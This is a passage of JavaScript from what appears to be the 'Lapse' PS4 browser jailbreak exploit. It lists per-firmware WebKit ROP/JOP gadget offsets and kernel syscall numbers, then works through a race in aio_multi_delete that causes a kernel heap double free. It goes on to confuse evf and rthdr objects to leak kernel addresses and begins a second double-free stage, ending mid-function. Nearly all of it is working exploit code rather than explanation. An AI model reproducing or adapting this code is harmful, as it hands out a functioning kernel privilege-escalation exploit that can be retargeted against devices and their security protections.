      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x160c0 }));
      Chain = Chain700_852;
      break;
    case 0x850:
    case 0x852:
      off_ta_vt = 0x236d4a0;
      off_wk_stack_chk_fail = 0x8d8;
      off_scf = 0x153c0;
      off_wk_strlen = 0x918;
      off_strlen = 0x4ef40;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000001ac7b, // `58 c3`
        "pop rbx; ret": 0x000000000000c46d, // `5b c3`
        "pop rcx; ret": 0x000000000001ac5f, // `59 c3`
        "pop rdx; ret": 0x0000000000282ea2, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x0000000000050878, // `5e c3`
        "pop rdi; ret": 0x0000000000091afa, // `5f c3`
        "pop rsp; ret": 0x0000000000073c2b, // `5c c3`
        "pop r8; ret": 0x000000000003b4b3, // `47 58 c3`
        "pop r9; ret": 0x00000000010f372f, // `47 59 c3`
        "pop r10; ret": 0x0000000000b1a721, // `47 5a c3`
        "pop r11; ret": 0x0000000000eaba69, // `4f 5b c3`
        "pop r12; ret": 0x0000000000eaf80d, // `47 5c c3`
        "pop r13; ret": 0x00000000019a0d8b, // `41 5d c3`
        "pop r14; ret": 0x0000000000050877, // `41 5e c3`
        "pop r15; ret": 0x00000000007e2efd, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000001ba53, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000003734c, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000001433b, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x0000000000008e7f, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x0000000000cf6c22, // `89 30 c3`
      
        [jop8]: 0x00000000019881d0, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x00000000011c9df0, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x000000000126c9c5, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x00000000021f3a2e, // `52 ff 20`
        [jop7]: 0x0000000000073c2b, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x25904, "setcontext": 0x29c38 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x10750 }));
      Chain = Chain700_852;
      break;
    case 0x900:
    case 0x903:
    case 0x904:
      off_ta_vt = 0x2e73c18;
      off_wk_stack_chk_fail = 0x178;
      off_scf = 0x1ff60;
      off_wk_strlen = 0x198;
      off_strlen = 0x4fa40;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000051a12, // `58 c3`
        "pop rbx; ret": 0x00000000000be5d0, // `5b c3`
        "pop rcx; ret": 0x00000000000657b7, // `59 c3`
        "pop rdx; ret": 0x000000000000986c, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000001f4d6, // `5e c3`
        "pop rdi; ret": 0x0000000000319690, // `5f c3`
        "pop rsp; ret": 0x000000000004e293, // `5c c3`
        "pop r8; ret": 0x00000000001a7ef1, // `47 58 c3`
        "pop r9; ret": 0x0000000000422571, // `47 59 c3`
        "pop r10; ret": 0x0000000000e9e1d1, // `47 5a c3`
        "pop r11; ret": 0x00000000012b1d51, // `47 5b c3`
        "pop r12; ret": 0x000000000085ec71, // `47 5c c3`
        "pop r13; ret": 0x00000000001da461, // `47 5d c3`
        "pop r14; ret": 0x0000000000685d73, // `47 5e c3`
        "pop r15; ret": 0x00000000006ab3aa, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000008db5b, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x00000000000241cc, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000000613b, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x000000000000613c, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000005c3482, // `89 30 c3`
      
        [jop1]: 0x00000000004e62a4,
        [jop2]: 0x00000000021fce7e,
        [jop3]: 0x00000000019becb4,
      
        [jop4]: 0x0000000000683800,
        [jop5]: 0x0000000000303906,
        [jop6]: 0x00000000028bd332,
        [jop7]: 0x000000000004e293,
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x24f04, "setcontext": 0x29448 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0xcb80 }));
      Chain = Chain900_960;
      break;
    case 0x950:
    case 0x951:
    case 0x960:
      off_ta_vt = 0x2ebea68;
      off_wk_stack_chk_fail = 0x178;
      off_scf = 0x28870;
      off_wk_strlen = 0x198;
      off_strlen = 0x4c040;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000011c46, // `58 c3`
        "pop rbx; ret": 0x0000000000013730, // `5b c3`
        "pop rcx; ret": 0x0000000000035a1e, // `59 c3`
        "pop rdx; ret": 0x000000000018de52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x0000000000092a8c, // `5e c3`
        "pop rdi; ret": 0x000000000005d19d, // `5f c3`
        "pop rsp; ret": 0x00000000000253e0, // `5c c3`
        "pop r8; ret": 0x000000000003fe32, // `47 58 c3`
        "pop r9; ret": 0x0000000000aaad51, // `47 59 c3`
        "pop r11; ret": 0x0000000001833a21, // `47 5b c3`
        "pop r12; ret": 0x0000000000420ad1, // `47 5c c3`
        "pop r13; ret": 0x00000000018fc4c1, // `47 5d c3`
        "pop r14; ret": 0x000000000028c900, // `41 5e c3`
        "pop r15; ret": 0x0000000001437c8a, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x0000000000056322, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000000c671, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x0000000000010c07, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x00000000000071d0, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x000000000007ebd8, // `89 30 c3`
      
        [jop1]: 0x000000000060fd94, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
        [jop11]: 0x0000000002bf3741, // `5e f5 ff 60 7c`
        [jop3]: 0x000000000181e974, // `48 8b 78 08 48 8b 07 ff 60 30`
      
        [jop4]: 0x00000000001a75a0, // `55 48 89 e5 48 8b 07 ff 50 58`
        [jop5]: 0x000000000035fc94, // `48 8b 50 18 48 8b 07 ff 50 10`
        [jop6]: 0x00000000002b7a9c, // `52 ff 20`
        [jop7]: 0x00000000000253e0, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x21284, "setcontext": 0x254dc }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0xbb60 }));
      Chain = Chain900_960;
      break;
    default:
      throw "Unsupported firmware";
  }
  syscall_array = [];
  libwebkit_base = null;
  libkernel_base = null;
  libc_base = null;
  gadgets = new Map();
  chain = null;
  nogc = [];
  syscall_map = new Map(Object.entries({
    'read': 3,
    'write': 4,
    'open': 5,
    'close': 6,
    'getpid': 20,
    'setuid': 23,
    'getuid': 24,
    'accept': 30,
    'pipe': 42,
    'ioctl': 54,
    'munmap': 73,
    'mprotect': 74,
    'fcntl': 92,
    'socket': 97,
    'connect': 98,
    'bind': 104,
    'setsockopt': 105,
    'listen': 106,
    'getsockopt': 118,
    'fchmod': 124,
    'socketpair': 135,
    'fstat': 189,
    'getdirentries': 196,
    '__sysctl': 202,
    'mlock': 203,
    'munlock': 204,
    'clock_gettime': 232,
    'nanosleep': 240,
    'sched_yield': 331,
    'kqueue': 362,
    'kevent': 363,
    'rtprio_thread': 466,
    'mmap': 477,
    'ftruncate': 480,
    'shm_open': 482,
    'cpuset_getaffinity': 487,
    'cpuset_setaffinity': 488,
    'jitshm_create': 533,
    'jitshm_alias': 534,
    'evf_create': 538,
    'evf_delete': 539,
    'evf_set': 544,
    'evf_clear': 545,
    'set_vm_container': 559,
    'dmem_container': 586,
    'dynlib_dlsym': 591,
    'dynlib_get_list': 592,
    'dynlib_get_info': 593,
    'dynlib_load_prx': 594,
    'randomized_path': 602,
    'budget_get_ptype': 610,
    'thr_suspend_ucontext': 632,
    'thr_resume_ucontext': 633,
    'blockpool_open': 653,
    'blockpool_map': 654,
    'blockpool_unmap': 655,
    'blockpool_batch': 657,
    // syscall 661 is unimplemented so free for use. a kernel exploit will
    // install "kexec" here
    'aio_submit': 661,
    'kexec': 661,
    'aio_multi_delete': 662,
    'aio_multi_wait': 663,
    'aio_multi_poll': 664,
    'aio_multi_cancel': 666,
    'aio_submit_cmd': 669,
    'blockpool_move': 673
  }));
  return 1;
}
//================================================================================================
// Lapse Init Function ========================================================================
//================================================================================================
async function doLapseInit() {
  try {
    var init_status;
    init_status = Init_LapseGlobals();
    if (init_status !== 1) {
      window.log("Global variables not properly initialized. Please refresh page and try again...", "red");
      return 0;
    }
    await lapse_init();
  } catch (error) {
    window.log("An error occured during Lapse initialization\nPlease refresh page and try again...\nError definition: " + error, "red");
    return 0;
  }
  try {
    // Check if jailbreak already done before
    if (sysi("setuid", 0) == 0) {
      window.log("\nAlready jailbroken, no need to re-jailbreak.", "green");

      if (sessionStorage.getItem("payload_path") == null) {
        let currentJbFlavor = user.currentJbFlavor || localStorage.getItem("currentJbFlavor") || "GoldHEN";
        if (confirm("Load " + currentJbFlavor + "? Otherwise we'll launch a BinLoader!")){

          if (currentJbFlavor == "HEN") {
            HEN();
          } else GoldHEN();
          PayloadLoader(sessionStorage.getItem("payload_path"));

        }else runBinLoader();
      } 
      if (sessionStorage.getItem('binloader')) {
        runBinLoader();
      }else {
        PayloadLoader(sessionStorage.getItem("payload_path"));
        if (typeof jailbreakSuccess == "function"){
        jailbreakSuccess();
      }
      }

      return 0;
    }
  }
  catch (error) {
    //window.log("\nAn error occured during if jailbroken test: " + error, "red");
  }
  return 1;
}
//================================================================================================

// sys/socket.h
const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;
// netinet/in.h
const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
// netinet/tcp.h
const TCP_INFO = 0x20;
const size_tcp_info = 0xec;
// netinet/tcp_fsm.h
const TCPS_ESTABLISHED = 4;
// netinet6/in6.h
const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;
// sys/cpuset.h
const CPU_LEVEL_WHICH = 3;
const CPU_WHICH_TID = 1;
const sizeof_cpuset_t_ = 16;
// CONFIG CONSTANTS
const main_core = 7;
const num_handles = 0x100;
const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
const num_alias = 100;
const num_races = 100;
const leak_len = 16;
const num_clobbers = 8;

function poll_aio(ids, states, num_ids=ids.length) {
  if (states !== undefined) {
    states = states.addr;
  }
  aio_multi_poll(ids.addr, num_ids, states);
}

function free_aios(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (var bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
}

function free_aios2(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (var bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
}

function get_cpu_affinity(mask) {
  sysi(
    'cpuset_getaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    sizeof_cpuset_t_,
    mask.addr
  );
}

function set_cpu_affinity(mask) {
  sysi(
    'cpuset_setaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    sizeof_cpuset_t_,
    mask.addr
  );
}

function pin_to_core(core) {
  const mask = new Buffer(sizeof_cpuset_t_);
  mask.write32(0, 1 << core);
  set_cpu_affinity(mask);
}

function get_core_index(mask) {
  var num = mem.read32(mask.addr);
  var position = 0;
  while (num > 0) {
    num = num >>> 1;
    position += 1;
  }
  return position - 1;
}

function get_current_core() {
  const mask = new Buffer(sizeof_cpuset_t_);
  get_cpu_affinity(mask);
  return get_core_index(mask);
}

function get_current_rtprio() {
  const _rtprio = new Buffer(4);
  sysi('rtprio_thread', RTP_LOOKUP, 0, _rtprio.addr);
  return {
    type: _rtprio.read16(0),
    prio: _rtprio.read16(2),
  };
}

function set_rtprio(rtprio_obj) {
  const _rtprio = new Buffer(4);
  _rtprio.write16(0, rtprio_obj.type);
  _rtprio.write16(2, rtprio_obj.prio);
  sysi('rtprio_thread', RTP_SET, 0, _rtprio.addr);
}

function close(fd) {
  sysi('close', fd);
}

function new_socket() {
  return sysi('socket', AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

function new_tcp_socket() {
  return sysi('socket', AF_INET, SOCK_STREAM, 0);
}

function gsockopt(sd, level, optname, optval, optlen) {
  const size = new Word(optval.size);
  if (optlen !== undefined) {
    size[0] = optlen;
  }
  sysi('getsockopt', sd, level, optname, optval.addr, size.addr);
  return size[0];
}

function setsockopt(sd, level, optname, optval, optlen) {
  sysi('setsockopt', sd, level, optname, optval, optlen);
}

function ssockopt(sd, level, optname, optval, optlen) {
  if (optlen === undefined) {
    optlen = optval.size;
  }

  const addr = optval.addr;
  setsockopt(sd, level, optname, addr, optlen);
}

function get_rthdr(sd, buf, len) {
  return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function set_rthdr(sd, buf, len) {
  ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function free_rthdrs(sds) {
  for (const sd of sds) {
    setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
  }
}

function build_rthdr(buf, size) {
  const len = ((size >> 3) - 1) & ~1;
  size = (len + 1) << 3;
  buf[0] = 0;
  buf[1] = len;
  buf[2] = 0;
  buf[3] = len >> 1;
  return size;
}

function spawn_thread(thread) {
  const off_context_size = 0xc8;
  const ctx = new Buffer(off_context_size);
  const pthread = new Pointer();
  pthread.ctx = ctx;
  // pivot the pthread's stack pointer to our stack
  ctx.write64(0x38, thread.stack_addr);
  ctx.write64(0x80, thread.get_gadget('ret'));
  call_nze(
    'pthread_create',
    pthread.addr,
    0,
    chain.get_gadget('setcontext'),
    ctx.addr
  );
  return pthread;
}
//================================================================================================
// FUNCTIONS FOR STAGE: 0x80 MALLOC ZONE DOUBLE FREE =============================================
//================================================================================================
function make_aliased_rthdrs(sds) {
  const marker_offset = 4;
  const size = 0x80;
  const buf = new Buffer(size);
  const rsize = build_rthdr(buf, size);
  for (var loop = 0; loop < num_alias; loop++) {
    for (var i = 0; i < num_sds; i++) {
      buf.write32(marker_offset, i);
      set_rthdr(sds[i], buf, rsize);
    }
    for (var i = 0; i < sds.length; i++) {
      get_rthdr(sds[i], buf);
      const marker = buf.read32(marker_offset);
      if (marker !== i) {
        //log(`aliased rthdrs at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        //log(`found pair: ${pair}`);
        sds.splice(marker, 1);
        sds.splice(i, 1);
        free_rthdrs(sds);
        sds.push(new_socket(), new_socket());
        return pair;
      }
    }
  }
  die(`failed to make aliased rthdrs. size: ${hex(size)}`);
}
// summary of the bug at aio_multi_delete():
//void free_queue_entry(struct aio_entry *reqs2) {
//  if (reqs2->ar2_spinfo != NULL) {
//    printf(
//      "[0]%s() line=%d Warning !! split info is here\n",
//      __func__,
//      __LINE__
//    );
//  }
//  if (reqs2->ar2_file != NULL) {
//    // we can potentially delay .fo_close()
//    fdrop(reqs2->ar2_file, curthread);
//    reqs2->ar2_file = NULL;
//  }
//  free(reqs2, M_AIO_REQS2);
//}
//int _aio_multi_delete(
//  struct thread *td,
//  SceKernelAioSubmitId ids[],
//  u_int num_ids,
//  int sce_errors[]) {
//  // ...
//  struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
//  // ...
//  u_int rem_ids = obj->ao_rem_ids;
//  if (rem_ids != 1) {
//    // BUG: wlock not acquired on this path
//    obj->ao_rem_ids = --rem_ids;
//    // ...
//    free_queue_entry(obj->ao_entries[req_idx]);
//    // the race can crash because of a NULL dereference since this path
//    // doesn't check if the array slot is NULL so we delay
//    // free_queue_entry()
//    obj->ao_entries[req_idx] = NULL;
//  } else {
//    // ...
//  }
//  // ...
//}
function race_one(request_addr, tcp_sd, barrier, racer, sds) {
  const sce_errs = new View4([-1, -1]);
  const thr_mask = new Word(1 << main_core);
  const thr = racer;
  thr.push_syscall(
    'cpuset_setaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    8,
    thr_mask.addr
  );
  thr.push_syscall('rtprio_thread', RTP_SET, 0, get_rtprio().addr);
  thr.push_gadget('pop rax; ret');
  thr.push_value(1);
  thr.push_get_retval();
  thr.push_call('pthread_barrier_wait', barrier.addr);
  thr.push_syscall(
    'aio_multi_delete',
    request_addr,
    1,
    sce_errs.addr_at(1)
  );
  thr.push_call('pthread_exit', 0);
  const pthr = spawn_thread(thr);
  const thr_tid = pthr.read32(0);
  // pthread barrier implementation:
  // given a barrier that needs N threads for it to be unlocked, a thread
  // will sleep if it waits on the barrier and N - 1 threads havent't arrived
  // before
  // if there were already N - 1 threads then that thread (last waiter) won't
  // sleep and it will send out a wake-up call to the waiting threads
  // since the ps4's cores only have 1 hardware thread each, we can pin 2
  // threads on the same core and control the interleaving of their
  // executions via controlled context switches
  // wait for the worker to enter the barrier and sleep
  while (thr.retval_int === 0) {
    sys_void('sched_yield');
  }
  // enter the barrier as the last waiter
  chain.push_call('pthread_barrier_wait', barrier.addr);
  // yield and hope the scheduler runs the worker next. the worker will then
  // sleep at soclose() and hopefully we run next
  chain.push_syscall('sched_yield');
  // if we get here and the worker hasn't been reran then we can delay the
  // worker's execution of soclose() indefinitely
  chain.push_syscall('thr_suspend_ucontext', thr_tid);
  chain.push_get_retval();
  chain.push_get_errno();
  chain.push_end();
  chain.run();
  chain.reset();
  const main_res = chain.retval_int;
  //log(`suspend ${thr_tid}: ${main_res} errno: ${chain.errno}`);
  if (main_res === -1) {
    call_nze('pthread_join', pthr, 0);
    //log();
    return null;
  }
  var won_race = false;
  try {
    const poll_err = new View4(1);
    aio_multi_poll(request_addr, 1, poll_err.addr);
    //log(`poll: ${hex(poll_err[0])}`);
    const info_buf = new View1(size_tcp_info);
    const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
    //log(`info size: ${hex(info_size)}`);
    if (info_size !== size_tcp_info) {
      die(`info size isn't ${size_tcp_info}: ${info_size}`);
    }
    const tcp_state = info_buf[0];
    //log(`tcp_state: ${tcp_state}`);
    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    if (poll_err[0] !== SCE_KERNEL_ERROR_ESRCH
      && tcp_state !== TCPS_ESTABLISHED
    ) {
      // PANIC: double free on the 0x80 malloc zone. important kernel
      // data may alias
      aio_multi_delete(request_addr, 1, sce_errs.addr);
      won_race = true;
    }
  } finally {
    //log('resume thread\n');
    sysi('thr_resume_ucontext', thr_tid);
    call_nze('pthread_join', pthr, 0);
  }
  if (won_race) {
    //log(`race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
    // if the code has no bugs then this isn't possible but we keep the
    // check for easier debugging
    if (sce_errs[0] !== sce_errs[1]) {
      //log('ERROR: bad won_race');
      die('ERROR: bad won_race');
    }
    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x80 malloc zone pointers aliased
    return make_aliased_rthdrs(sds);
  }
  return null;
}
//================================================================================================
// STAGE DOUBLE FREE AIO QUEUE ENTRY =============================================================
//================================================================================================
function double_free_reqs2(sds) {
  function swap_bytes(x, byte_length) {
    var res = 0;
    for (var i = 0; i < byte_length; i++) {
      res |= ((x >> (8 * i)) & 0xff) << (8 * (byte_length - i - 1));
    }
    return res >>> 0;
  }
  function htons(x) {
    return swap_bytes(x, 2);
  }
  function htonl(x) {
    return swap_bytes(x, 4);
  }
  const server_addr = new Buffer(16);
  // sockaddr_in.sin_family
  server_addr[1] = AF_INET;
  // sockaddr_in.sin_port
  server_addr.write16(2, htons(5050));
  // sockaddr_in.sin_addr = 127.0.0.1
  server_addr.write32(4, htonl(0x7f000001));
  const racer = new Chain();
  const barrier = new Long();
  call_nze('pthread_barrier_init', barrier.addr, 0, 2);
  const num_reqs = 3;
  const which_req = num_reqs - 1;
  const reqs1 = make_reqs1(num_reqs);
  const reqs1_p = reqs1.addr;
  const aio_ids = new View4(num_reqs);
  const aio_ids_p = aio_ids.addr;
  const req_addr = aio_ids.addr_at(which_req);
  const cmd = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
  const sd_listen = new_tcp_socket();
  ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, new Word(1));
  sysi('bind', sd_listen, server_addr.addr, server_addr.size);
  sysi('listen', sd_listen, 1);
  for (var i = 0; i < num_races; i++) {
    const sd_client = new_tcp_socket();
    sysi('connect', sd_client, server_addr.addr, server_addr.size);
    const sd_conn = sysi('accept', sd_listen, 0, 0);
    // force soclose() to sleep
    ssockopt(sd_client, SOL_SOCKET, SO_LINGER, View4.of(1, 1));
    reqs1.write32(0x20 + which_req * 0x28, sd_client);
    aio_submit_cmd(cmd, reqs1_p, num_reqs, aio_ids_p);
    aio_multi_cancel(aio_ids_p, num_reqs);
    aio_multi_poll(aio_ids_p, num_reqs);
    // drop the reference so that aio_multi_delete() will trigger _fdrop()
    close(sd_client);
    const res = race_one(req_addr, sd_conn, barrier, racer, sds);
    racer.reset();
    // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
    // twice. this will leave one request undeleted
    aio_multi_delete(aio_ids_p, num_reqs);
    close(sd_conn);
    if (res !== null) {
      window.log(` - Won race at attempt: ${i}`);
      close(sd_listen);
      call_nze('pthread_barrier_destroy', barrier.addr);
      return res;
    }
  }
  die('failed aio double free');
}
//================================================================================================
// FUNCTIONS FOR STAGE: LEAK 0x100 MALLOC ZONE ADDRESS ===========================================
//================================================================================================
function new_evf(flags) {
  const name = cstr('');
  // int evf_create(char *name, uint32_t attributes, uint64_t flags)
  return sysi('evf_create', name.addr, 0, flags);
}

function set_evf_flags(id, flags) {
  sysi('evf_clear', id, 0);
  sysi('evf_set', id, flags);
}

function free_evf(id) {
  sysi('evf_delete', id);
}

function verify_reqs2(buf, offset) {
  // reqs2.ar2_cmd
  if (buf.read32(offset) !== AIO_CMD_WRITE) {
    return false;
  }
  // heap addresses are prefixed with 0xffff_xxxx
  // xxxx is randomized on boot
  // heap_prefixes is a array of randomized prefix bits from a group of heap
  // address candidates. if the candidates truly are from the heap, they must
  // share a common prefix
  const heap_prefixes = [];
  // check if offsets 0x10 to 0x20 look like a kernel heap address
  for (var i = 0x10; i <= 0x20; i += 8) {
    if (buf.read16(offset + i + 6) !== 0xffff) {
      return false;
    }
    heap_prefixes.push(buf.read16(offset + i + 4));
  }
  // check reqs2.ar2_result.state
  // state is actually a 32-bit value but the allocated memory was
  // initialized with zeros. all padding bytes must be 0 then
  const state = buf.read32(offset + 0x38);
  if (!(0 < state && state <= 4) || buf.read32(offset + 0x38 + 4) !== 0) {
    return false;
  }
  // reqs2.ar2_file must be NULL since we passed a bad file descriptor to
  // aio_submit_cmd()
  if (!buf.read64(offset + 0x40).eq(0)) {
    return false;
  }
  // check if offsets 0x48 to 0x50 look like a kernel address
  for (var i = 0x48; i <= 0x50; i += 8) {
    if (buf.read16(offset + i + 6) === 0xffff) {
      // don't push kernel ELF addresses
      if (buf.read16(offset + i + 4) !== 0xffff) {
        heap_prefixes.push(buf.read16(offset + i + 4));
      }
      // offset 0x48 can be NULL
    } else if (i === 0x50 || !buf.read64(offset + i).eq(0)) {
      return false;
    }
  }
  return heap_prefixes.every((e, i, a) => e === a[0]);
}
//================================================================================================
// STAGE LEAK KERNEL ADDRESSES ===================================================================
//================================================================================================
function leak_kernel_addrs(sd_pair) {
  close(sd_pair[1]);
  const sd = sd_pair[0];
  const buf = new Buffer(0x80 * leak_len);
  // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
  // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
  //log('confuse evf with rthdr');
  var evf = null;
  for (var i = 0; i < num_alias; i++) {
    const evfs = [];
    for (var j = 0; j < num_handles; j++) {
      evfs.push(new_evf(0xf00 | (j << 16)));
    }
    get_rthdr(sd, buf, 0x80);
    // for simplicity, we'll assume i < 2**16
    const flags32 = buf.read32(0);
    evf = evfs[flags32 >>> 16];
    set_evf_flags(evf, flags32 | 1);
    get_rthdr(sd, buf, 0x80);
    // double check with Al-Azif
    if (buf.read32(0) === (flags32 | 1)) {
      evfs.splice(flags32 >> 16, 1);
    } else {
      evf = null;
    }
    for (const evf of evfs) {
      free_evf(evf);
    }
    if (evf !== null) {
      //log(`confused rthdr and evf at attempt: ${i}`);
      break;
    }
  }
  if (evf === null) {
    die('failed to confuse evf and rthdr');
  }
  set_evf_flags(evf, 0xff << 8);
  get_rthdr(sd, buf, 0x80);
  // fields we use from evf (number before the field is the offset in hex):
  // struct evf:
  //     0 u64 flags
  //     28 struct cv cv
  //     38 TAILQ_HEAD(struct evf_waiter) waiters
  // evf.cv.cv_description = "evf cv"
  // string is located at the kernel's mapped ELF file
  const kernel_addr = buf.read64(0x28);
  //log(`"evf cv" string addr: ${kernel_addr}`);
  // because of TAILQ_INIT(), we have:
  // evf.waiters.tqh_last == &evf.waiters.tqh_first
  // we now know the address of the kernel buffer we are leaking
  const kbuf_addr = buf.read64(0x40).sub(0x38);
  //log(`kernel buffer addr: ${kbuf_addr}`);
  // 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
  // allocate reqs1 arrays at 0x100 malloc zone
  const num_elems = 6;
  // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
  // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
  // field
  const ucred = kbuf_addr.add(4);
  const leak_reqs = make_reqs1(num_elems);
  const leak_reqs_p = leak_reqs.addr;
  leak_reqs.write64(0x10, ucred);
  const leak_ids_len = num_handles * num_elems;
  const leak_ids = new View4(leak_ids_len);
  const leak_ids_p = leak_ids.addr;
  const num_leaks_kernel = 30;
  //log('find aio_entry');
  var reqs2_off = null;
  var found = 0;
  var found_off = 0;
  for (var i = 0; (i < num_leaks_kernel) && !found; i++) {
    get_rthdr(sd, buf);
    spray_aio(
      num_handles,
      leak_reqs_p,
      num_elems,
      leak_ids_p,
      true,
      AIO_CMD_WRITE
    );
    get_rthdr(sd, buf);
    for (var off = 0x80; off < buf.length; off += 0x40) {
      if (verify_reqs2(buf, off)) {
        found_off = off;
        found = true;
        window.log(` - Found reqs2 at attempt: ${i}`);
        break;
      }
    }
    if (!found) {
      free_aios(leak_ids_p, leak_ids_len);
    }
  }
  if (found) {
    reqs2_off = found_off;
  }
  if (reqs2_off === null) {
    die('could not leak a reqs2');
  }
  //log(`reqs2 offset: ${hex(reqs2_off)}`);
  get_rthdr(sd, buf);
  const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
  //log('leaked aio_entry:');
  //hexdump(reqs2);
  const reqs1_addr = new Long(reqs2.read64(0x10));
  //log(`reqs1_addr: ${reqs1_addr}`);
  reqs1_addr.lo &= -0x100;
  //log(`reqs1_addr: ${reqs1_addr}`);
  //log('searching target_id');
  var target_id = null;
  var to_cancel_p = null;
  var to_cancel_len = null;
  for (var i = 0; i < leak_ids_len; i += num_elems) {
    aio_multi_cancel(leak_ids_p.add(i << 2), num_elems);
    get_rthdr(sd, buf);
    const state = buf.read32(reqs2_off + 0x38);
    if (state === AIO_STATE_ABORTED) {
      window.log(` - Found target_id at batch: ${i / num_elems}`);
      target_id = new Word(leak_ids[i]);
      leak_ids[i] = 0;
      //log(`target_id: ${hex(target_id)}`);
      const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
      //log('leaked aio_entry:');
      //hexdump(reqs2);
      const start = i + num_elems;
      to_cancel_p = leak_ids.addr_at(start);
      to_cancel_len = leak_ids_len - start;
      break;
    }
  }
  if (target_id === null) {
    die('target_id not found');
  }
  cancel_aios(to_cancel_p, to_cancel_len);
  free_aios2(leak_ids_p, leak_ids_len);
  return [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf];
}
//================================================================================================
// FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE ============================================
//================================================================================================
function make_aliased_pktopts(sds) {
  const tclass = new Word();
  const pktopts_loopcnt = 1;
  for (var loop = 0; loop < pktopts_loopcnt; loop++) {
    for (var i = 0; i < num_sds; i++) {
      setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    for (var i = 0; i < num_sds; i++) {
      tclass[0] = i;
      ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
    }
    for (var i = 0; i < sds.length; i++) {
